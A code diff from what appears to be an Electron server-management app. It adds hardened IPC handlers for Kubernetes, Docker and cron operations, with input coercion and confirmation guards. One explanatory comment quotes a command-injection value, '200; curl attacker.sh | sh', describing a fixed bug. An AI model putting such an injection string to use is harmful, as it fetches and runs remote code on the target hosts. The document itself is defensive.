@@ -52,11 +52,13 @@ import { FleetSampler, setActiveFleetSampler } from './services/fleetSampler'
 import { BroadcastRunner } from './services/broadcast'
 import { LogTailer } from './services/logTail'
 import type { LogLine, LogSource, LogTailState } from '../shared/logtail'
-import { CRON_COLLECT_COMMAND, parseCronCollection, type CronEntry } from '../shared/cron'
+import { CRON_COLLECT_COMMAND, parseCronCollection, type CronEntry, type CronSourceReport } from '../shared/cron'
 import { DockerReader } from './services/docker'
 import { buildDockerLogsCommand } from '../shared/docker'
+import type { DockerAction, DockerLogsOptions } from '../shared/docker'
 import { KubernetesReader } from './services/kubernetes'
 import { buildK8sLogsCommand } from '../shared/kubernetes'
+import type { K8sRolloutTarget } from '../shared/kubernetes'
 import type { BroadcastProgress, BroadcastRequest } from '../shared/broadcast'
 import type { FleetSamplerConfig } from '../shared/fleet'
 import {
@@ -671,6 +673,11 @@ ipcMain.handle('logtail:stop', (_e, tailId: string) => {
   logTailer.stop(tailId)
   return true
 })
+// Pause holds the stream and leaves the SSH channel open, so narrowing what you
+// are looking at does not cost the buffer you were reading. Stop is still the
+// thing that ends the remote command.
+ipcMain.handle('logtail:pause', (_e, tailId: string) => logTailer.pause(tailId))
+ipcMain.handle('logtail:resume', (_e, tailId: string) => logTailer.resume(tailId))
 
 // ---- Docker ----
 //
@@ -734,11 +741,43 @@ ipcMain.handle(
   }
 )
 
+ipcMain.handle(
+  'k8s:diagnose',
+  (_e, cfg: unknown, namespace: string, pod: string, context?: string, previousLines?: unknown) => {
+    // Coerced and clamped here, not trusted from the annotation. An IPC
+    // argument arrives as a structured-clone value with no runtime type, which
+    // is exactly how the docker:logs `lines` injection got in.
+    const n = Math.floor(Number(previousLines))
+    const safe = Number.isFinite(n) ? Math.min(5_000, Math.max(1, n)) : undefined
+    return k8sReader.diagnose(cfg, namespace, pod, context, safe)
+  }
+)
+ipcMain.handle('k8s:overview', (_e, cfg: unknown, context?: string, namespace?: string) =>
+  k8sReader.overview(cfg, context, namespace)
+)
+ipcMain.handle('k8s:usage', (_e, cfg: unknown, context?: string, namespace?: string) =>
+  k8sReader.usage(cfg, context, namespace)
+)
+// The only state-changing channel in this module.
+//
+// `confirmed === true` rather than a truthiness check, and it is NOT the
+// security boundary — the renderer is not one. It is a guard against a caller
+// that reached this channel without going through a dialog, which is a mistake
+// worth catching loudly. The real boundaries are that the service re-derives
+// the plan itself and the builder throws on an unknown kind or an unsafe name.
+ipcMain.handle(
+  'k8s:rollout-restart',
+  (_e, cfg: unknown, target: K8sRolloutTarget, confirmed: unknown) =>
+    k8sReader.rolloutRestart(cfg, target, confirmed === true)
+)
+
 ipcMain.handle('docker:list', (_e, cfg: unknown, opts?: { sudo?: boolean; autoSudo?: boolean }) =>
   dockerReader.list(cfg, opts ?? {})
 )
 ipcMain.handle('docker:can-sudo', (_e, cfg: unknown) => dockerReader.canSudo(cfg))
-ipcMain.handle('docker:logs', async (_e, cfg: unknown, ref: string, lines: unknown) => {
+ipcMain.handle(
+  'docker:logs',
+  async (_e, cfg: unknown, ref: string, lines: unknown, opts?: DockerLogsOptions) => {
   // `lines: number` was a compile-time annotation only. IPC arguments are
   // structured-clone values with no runtime type, so a renderer — or anything
   // that can reach this channel — could pass "200; curl attacker.sh | sh" and
@@ -751,11 +790,53 @@ ipcMain.handle('docker:logs', async (_e, cfg: unknown, ref: string, lines: unkno
   // it; let that surface as a rejected invoke rather than running anything.
   const r = await sshExec(
     resolveChainSecrets(cfg as SshConnectConfig),
-    buildDockerLogsCommand(ref, safeLines),
+    // Every option re-derived from the raw value rather than trusted: these
+    // arrive as structured-clone values with no runtime type, and `since` is
+    // interpolated, so the builder's own allowlist is the thing that has to see
+    // it. `=== true` rather than truthiness for the same reason.
+    buildDockerLogsCommand(ref, safeLines, false, {
+      sudo: opts?.sudo === true,
+      timestamps: opts?.timestamps === true,
+      since: opts?.since
+    }),
     20_000
   )
   return { ok: r.ok, output: `${r.stdout ?? ''}${r.stderr ?? ''}`, error: r.error }
 })
+
+ipcMain.handle('docker:disk', (_e, cfg: unknown, opts?: { sudo?: boolean; autoSudo?: boolean }) =>
+  dockerReader.disk(cfg, opts ?? {})
+)
+ipcMain.handle(
+  'docker:inspect',
+  (_e, cfg: unknown, ref: string, opts?: { sudo?: boolean; autoSudo?: boolean }) =>
+    dockerReader.inspect(cfg, ref, opts ?? {})
+)
+ipcMain.handle(
+  'docker:stats',
+  (_e, cfg: unknown, refs: string[], opts?: { sudo?: boolean; autoSudo?: boolean }) =>
+    dockerReader.stats(cfg, refs, opts ?? {})
+)
+// The only state-changing docker channel.
+//
+// The builders validate the action against an allow-list and every ref against
+// what docker actually permits, and they THROW rather than escaping — so a
+// refused build surfaces as a rejected invoke instead of running anything. That
+// is deliberate: a bad ref here is a bug or an attack, not a host condition.
+//
+// `act` does not auto-escalate, unlike the read paths. The user approved
+// "restart this container", not "restart it as root if the socket refuses",
+// and a passwordless sudoers entry is not consent to a state change.
+ipcMain.handle(
+  'docker:act',
+  (
+    _e,
+    cfg: unknown,
+    action: DockerAction,
+    refs: string[],
+    opts?: { sudo?: boolean; timeoutSec?: number }
+  ) => dockerReader.act(cfg, action, refs, opts ?? {})
+)
 
 // ---- What is scheduled across the estate ----
 //
@@ -768,7 +849,18 @@ ipcMain.handle('docker:logs', async (_e, cfg: unknown, ref: string, lines: unkno
 ipcMain.handle(
   'cron:collect',
   async (_e, targets: { serverId: string; serverName: string; cfg: unknown }[]) => {
-    const out: { serverId: string; serverName: string; entries: CronEntry[]; unparsed: number; error?: string }[] = []
+    // `sources` says WHICH of the five cron sources each host actually managed
+    // to read, and why the rest were not. Without it the panel cannot tell
+    // "nothing is scheduled" from "/etc/cron.d is root-only and we were refused"
+    // — and on a fully loaded box those look identical and one of them is a lie.
+    const out: {
+      serverId: string
+      serverName: string
+      entries: CronEntry[]
+      unparsed: number
+      sources?: CronSourceReport[]
+      error?: string
+    }[] = []
     for (const t of targets) {
       try {
         // Reads every online server in one press; same stacked-dialog problem.
@@ -787,7 +879,8 @@ ipcMain.handle(
           serverId: t.serverId,
           serverName: t.serverName,
           entries: parsed.entries,
-          unparsed: parsed.unparsed.length
+          unparsed: parsed.unparsed.length,
+          sources: parsed.sources
         })
       } catch (e) {
         // One host refusing must not lose the others' schedules.
